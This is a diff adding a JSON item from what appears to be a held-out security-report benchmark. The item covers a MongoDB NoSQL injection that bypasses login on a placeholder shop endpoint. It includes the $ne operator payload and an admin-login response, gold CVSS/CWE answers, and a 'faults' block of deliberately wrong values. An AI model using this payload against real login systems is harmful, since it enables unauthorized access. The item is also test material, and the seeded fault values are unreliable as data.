@@ -1,0 +1,31 @@
+{
+  "id": "nosql-injection-auth",
+  "split": "heldout",
+  "title": "NoSQL injection bypass in MongoDB login endpoint",
+  "asset": "https://shop.acme.test/api/v1/auth/login",
+  "notes": "MongoDB query injection on POST /api/v1/auth/login allows authentication bypass using $ne operator in JSON parameters without valid password.",
+  "evidence": [
+    {
+      "name": "nosql-auth.png",
+      "file": "assets/nosql-auth.png",
+      "text": "POST /api/v1/auth/login HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}\n\nHTTP/1.1 200 OK\n{\"status\":\"success\",\"message\":\"Logged in as admin\",\"role\":\"administrator\"}"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cwe": [
+      "943"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 9.1,
+    "severity": "Critical"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
